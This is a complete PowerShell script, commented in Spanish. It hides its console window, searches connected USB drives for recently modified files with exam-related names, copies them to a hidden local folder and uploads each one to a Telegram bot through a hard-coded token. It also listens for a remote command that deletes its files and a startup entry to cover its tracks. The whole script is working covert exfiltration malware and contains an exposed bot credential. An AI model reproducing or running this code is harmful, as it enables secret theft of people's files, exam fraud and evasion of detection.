# Ocultar la ventana del script
Add-Type -Name Win32 -Namespace System -MemberDefinition '
    [DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);
    [DllImport("kernel32.dll")] public static extern int GetConsoleWindow();'
[System.Win32]::ShowWindow([System.Win32]::GetConsoleWindow(), 0)

# Config
$destinoBase = "C:\intel\data"
$hoy = Get-Date -Format "yyyyMMdd"
$destination = "$destinoBase\$hoy"

# Config del bot
$botToken = "7774118463:AAG4MeSpA4vWLgrSv6Ea-csm3Y6MLVSGrFA"
$chatID = "-1002347317015"
$telegramUri = "https://api.telegram.org/bot$botToken/sendDocument"

# Crea la carpeta si no existe
if (!(Test-Path -Path $destination)) {
    New-Item -ItemType Directory -Path $destination -Force | Out-Null
}

# copia archivos del USB sin duplicados
function Copiar-Archivos {
    param ($usbPath)

    # Define fecha para que coja solo archivos modificados en los ultimos 6 meses
    $fechaLimite = (Get-Date).AddMonths(-6)

    # Busca archivos con estas palabras clave y modificados
    $archivos = Get-ChildItem -Path $usbPath -Recurse | Where-Object {
        ($_.Name -match "examen|pregunta|modelo|respuesta|prueba|nota") -and
        ($_.LastWriteTime -gt $fechaLimite -or $_.CreationTime -gt $fechaLimite)
    }

    foreach ($archivo in $archivos) {
        $archivoDestino = "$destination\$($archivo.Name)"

        # Si el archivo ya existe, solo lo copia si ha sido modificado
        if (!(Test-Path $archivoDestino) -or ($archivo.LastWriteTime -gt (Get-Item $archivoDestino).LastWriteTime)) {
            Copy-Item -Path $archivo.FullName -Destination $archivoDestino -Force
            Enviar-Telegram $archivoDestino
        } 
    }
}

# para normalizar el nombre del archivo (eliminar acentos y caracteres especiales)
function Normalizar-NombreArchivo {
    param ($nombreArchivo)
    
    $normalized = $nombreArchivo -replace "[·‡‰¡¿ƒ]", "a" `
                                  -replace "[ÈËÎ…»À]", "e" `
                                  -replace "[ÌÏÔÕÃœ]", "i" `
                                  -replace "[ÛÚˆ”“÷]", "o" `
                                  -replace "[˙˘¸⁄Ÿ‹]", "u" `
                                  -replace "[Ò—]", "n" `
                                  -replace "[∫™]", "_" `
                                  -replace "[^a-zA-Z0-9._-]", "_"  # Reemplaza otros caracteres extraÒos con "_"

    return $normalized
}

# para enviar archivos a Telegram
function Enviar-Telegram {
    param ($archivo)
    
    if (Test-Path $archivo) {
        try {
            # Obtener nombre de archivo normalizado
            $nombreOriginal = [System.IO.Path]::GetFileName($archivo)
            $nombreNormalizado = Normalizar-NombreArchivo $nombreOriginal

            # Leer el archivo como bytes
            $fileBytes = [System.IO.File]::ReadAllBytes($archivo)
            $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
            $boundary = [System.Guid]::NewGuid().ToString()
            $LF = "`r`n"

            # Crear el cuerpo de la solicitud multipart/form-data
            $bodyLines = (
                "--$boundary",
                "Content-Disposition: form-data; name=`"chat_id`"$LF",
                $chatID,
                "--$boundary",
                "Content-Disposition: form-data; name=`"document`"; filename=`"$nombreNormalizado`"",
                "Content-Type: application/octet-stream$LF",
                $fileEnc,
                "--$boundary--$LF"
            ) -join $LF

            # Enviar el archivo a Telegram
            Invoke-RestMethod -Uri $telegramUri -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
        } catch {
            Write-Output " Error al enviar archivo a Telegram: $_"
        }
    }
}

# Esto es para borrado remoto
function Verificar-Comandos-Telegram {
    $updateUri = "https://api.telegram.org/bot$botToken/getUpdates"

    try {
        # Obtiene los mensajes recientes del bot
        $response = Invoke-RestMethod -Uri $updateUri -Method Get
        $mensajes = $response.result

        foreach ($mensaje in $mensajes) {
            $texto = $mensaje.message.text
            $usuarioID = $mensaje.message.chat.id

            # Verifica si el mensaje es de tu chatID y si es el comando de borrado
            if ($usuarioID -eq $chatID -and $texto -eq "/borrar_todo2") {
                
                # Envia mensaje avisando que borra
                $confirmUri = "https://api.telegram.org/bot$botToken/sendMessage"
                $body = @{
                    "chat_id" = $chatID
                    "text" = "Se procede a borrar todos los archivos en 10 segundos..."
                } | ConvertTo-Json -Compress
                Invoke-RestMethod -Uri $confirmUri -Method Post -Body $body -ContentType "application/json"

                # Espera 10 segundos antes de borrar
                Start-Sleep -Seconds 10

                # Borra todo
                Remove-Item -Path "C:\intel" -Recurse -Force -ErrorAction SilentlyContinue
                Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\inicio.bat" -Force -ErrorAction SilentlyContinue

                # Envia el ok de borrado
                $finalBody = @{
                    "chat_id" = $chatID
                    "text" = "Todos los archivos han sido eliminados."
                } | ConvertTo-Json -Compress
                Invoke-RestMethod -Uri $confirmUri -Method Post -Body $finalBody -ContentType "application/json"

                Exit
            }
        }
    } catch {}
}

# Detecta unidades USB y las procesa
$usbDrives = Get-WmiObject Win32_Volume | Where-Object { $_.DriveType -eq 2 } | Select-Object -ExpandProperty Name

foreach ($usb in $usbDrives) {
    Copiar-Archivos $usb
}

# esto es para que compruebe si hay mensaje de borrado
    Verificar-Comandos-Telegram

    Exit